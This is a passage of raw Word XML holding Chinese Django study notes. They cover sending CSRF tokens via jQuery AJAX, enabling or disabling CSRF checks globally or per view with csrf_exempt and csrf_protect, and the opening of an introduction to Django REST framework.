          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"UTF-8"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F92E38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&lt;script src=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"/static/jquery-3.3.1.js"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31304F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&lt;script src=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"/static/jquery.cookie.js"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256A5CF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&lt;title&gt;Title&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7DA5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7B4BD8A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27C2E00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 action=</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 xml:space="preserve"> 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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1914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 csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F44C4A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&lt;p&gt;用户名：&lt;input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&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C382A2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&lt;p&gt;密码：&lt;input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xml:space="preserve"> id=</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&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B5256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&lt;p&gt;&lt;input type=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"submit"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D69C71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&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E07F7A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&lt;button </w:t>
      </w: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&gt;点我&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B3A48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20BC462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71DC485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).click(function () {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACF38D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var token=$.cookie(</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'csrftoken'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC3B19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//var token=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'{{ csrf_token }}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7081F8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$.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452FDAD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url: </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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EBAA9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headers:{</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'X-CSRFToken'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:token},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FC7B6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type: </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p>
    <w:p w14:paraId="1F173E1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data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B5D51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'[name="name"]'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).val(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBDB4C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).val(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCDA1D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3AC79E7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success: function (data) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1717D6E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console.log(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089C76A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7580752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5C1B318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1A47281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36D8AD8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3184F0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&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540A3E27" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00F1769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F17699">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>其它操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FF4319"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全站禁用：注释掉中间件</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> 'django.middleware.csrf.CsrfViewMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BDE34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局部禁用：用装饰器（在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>FBV</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中使用）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC4384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django.views.decorators.csrf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csrf_exempt,csrf_protect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAF41A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 不再检测，局部禁用（前提是全站使用）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7658F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 @csrf_exempt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403EF50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 检测，局部使用（前提是全站禁用）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4A377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@csrf_protect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3E1BE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csrf_token(request):</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C25B8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if</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> request.method==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p>
    <w:p w14:paraId="5C3EB46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(request.POST)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9C4D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434E7A6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'ok'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BAD6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render(request,</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'csrf_token.html'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBC1EBC"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在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中使用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F41F8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CBV中使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6AB3B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django.views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View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617E6C3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django.views.decorators.csrf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csrf_exempt,csrf_protect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0A854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django.utils.decorators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method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A79B9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 CBV的csrf装饰器，只能加载类上（django的bug）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090966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给get方法使用csrf_token检测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B1B48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@method_decorator(csrf_exempt,name=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'get'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)，#不能直接放在函数上，可以放在分发函数dispatch上不需要指定名字，是什么请求就会分发到指定的函数上</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64677AA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给post加</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DA44A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@method_decorator(csrf_exempt,name=</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r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00893DB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给所有方法加</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C10ACF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@method_decorator(csrf_exempt,name=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'get'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C7FDF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Foo(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1165916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get(self,request):</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0087066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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570C61A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post(self,request):</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110C5FBE" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00F1769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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C1A53C" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00BC6A81" w:rsidRDefault="00D96E02" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId144" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="00BC6A81">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222226"/>
            <w:kern w:val="36"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="42"/>
          </w:rPr>
          <w:t>Django Drf 到底是什么东西</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="05AF6F59"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   </w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在序列化与反序列化时，虽然操作的数据不尽相同，但是执行的过程却是相似的，也就是说这部分代码是可以复用简化编写的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B43FE6C"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在开发</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>REST API</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的视图中，虽然每个视图具体操作的数据不同，但增、删、改、查的实现流程基本套路化，所以这部分代码也是可以复用简化编写的：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5A0874"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增：校验请求数据</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执行反序列化过程</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保存数据库</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将保存的对象序列化并返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53993992"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删：判断要删除的数据是否存在</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执行数据库删除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668BCAC3"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改：判断要修改的数据是否存在</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校验请求的数据</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执行反序列化过程</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保存数据库</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将保存的对象序列化并返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3D6C7D"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查：查询数据库</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将数据序列化并返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79ECC4E3" w14:textId="1BEE97AC" w:rsidR="00870C85" w:rsidRPr="00126418"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Django REST framework</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可以帮助我们简化上述两部分的代码编写，大大提高</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>REST API</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的开发速度。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049DC1B2"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认识</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django REST framework</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4A2D5B" w14:textId="6E77CA6E" w:rsidR="00870C85" w:rsidRPr="00126418"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 xml:space="preserve">Django REST framework </w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架是一个用于构建</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Web API </w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的强大而又灵活的工具。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BABD52" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418"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通常简称为</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>DRF</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> REST framework</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11FDD4A6" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418"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DRF</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架是建立在</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架基础之上，由</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Tom Christie</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>大牛二次开发的开源项目。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A0AF44"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特点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606634F8"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提供了定义序列化器</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Serializer</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的方法，可以快速根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django ORM </w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或者其它库自动序列化</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>反序列化；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2AE28F"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提供了丰富的类视图、</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Mixin</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
